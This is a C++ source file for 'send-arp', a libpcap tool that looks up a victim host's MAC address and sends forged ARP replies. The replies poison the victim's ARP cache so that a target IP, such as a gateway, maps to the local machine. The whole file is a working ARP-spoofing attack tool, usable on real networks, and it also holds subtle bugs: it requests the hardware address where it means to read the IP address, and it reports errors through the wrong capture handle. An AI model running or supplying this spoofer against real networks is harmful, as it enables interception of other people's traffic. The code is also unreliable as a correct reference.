#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <cstring>
#include <string>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
	exit(1);
}

char *dev;
pcap_t *handle;
Mac mymac;
Ip myip;

void getmyinfo() {
	struct ifreq s;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		printf("Failed to make mac socket\n");
		exit(1);
	}

	strncpy(s.ifr_name, dev, IFNAMSIZ);
	if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
		printf("Failed to get MAC\n");
		exit(1);
	}

	uint8_t tmp[Mac::SIZE];
	memcpy(tmp, s.ifr_hwaddr.sa_data, Mac::SIZE);
	mymac = Mac(tmp);
	close(fd);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		printf("Failed to make ip socket\n");
		exit(1);
	}

	s.ifr_addr.sa_family = AF_INET;
	strncpy(s.ifr_name, dev, IFNAMSIZ);
	if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
		printf("Failed to get Ip address\n");
		exit(1);
	}

	myip = Ip(inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
	close(fd);
}

void makepacket(EthArpPacket *p, Mac smac, Mac dmac, Ip sip, Ip dip, bool isRequest) {
	p->eth_.smac_ = smac;
	p->eth_.dmac_ = dmac;
	p->eth_.type_ = htons(EthHdr::Arp);

	p->arp_.hrd_ = htons(ArpHdr::ETHER);
	p->arp_.pro_ = htons(EthHdr::Ip4);
	p->arp_.hln_ = Mac::SIZE;
	p->arp_.pln_ = Ip::SIZE;
	p->arp_.op_ = htons(isRequest ? ArpHdr::Request : ArpHdr::Reply);

	p->arp_.smac_ = smac;
	p->arp_.sip_ = htonl(sip);
	p->arp_.tmac_ = isRequest ? Mac("00:00:00:00:00:00"): dmac;
	p->arp_.tip_ = htonl(dip);
}

Mac getmac(Ip ip) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *tmp = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (tmp == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	while(1) {
		EthArpPacket packet;
		makepacket(&packet, mymac, Mac("ff:ff:ff:ff:ff:ff"), myip, ip, true);
		int res = pcap_sendpacket(tmp, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			printf("Failed to get Mac from %s\n", std::string(ip).c_str());
			exit(1);
		}

		struct pcap_pkthdr *header;
		const u_char *recv;
		res = pcap_next_ex(tmp, &header, &recv);
		if(res == 0)
			continue;
		if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(tmp));
			printf("Failed during getting Mac from %s\n", std::string(ip).c_str());
			pcap_close(tmp);
			exit(1);
		}

		EthArpPacket *ans = (EthArpPacket *) recv;
		if(htons(ans -> eth_.type_) == EthHdr::Arp && ntohl(ans -> arp_.sip_) == ip) {
			uint8_t ret[Mac::SIZE];
			memcpy(ret, & ans -> arp_.smac_, Mac::SIZE);
			return Mac(ret);
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1)
		usage();

	dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	getmyinfo();

	for(int i = 2; i < argc; i+=2) {
		Ip sip = Ip(argv[i]);
		Ip tip = Ip(argv[i + 1]);
		Mac smac = getmac(sip);

		EthArpPacket packet;
		makepacket(&packet, mymac, smac, tip, sip, false);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			printf("%s -> %s spoofing failed...\n", argv[i], argv[i + 1]);
			exit(1);
		}
		printf("Success: %s -> %s\n", argv[i], argv[i + 1]);
	}

	pcap_close(handle);
	return 0;
}
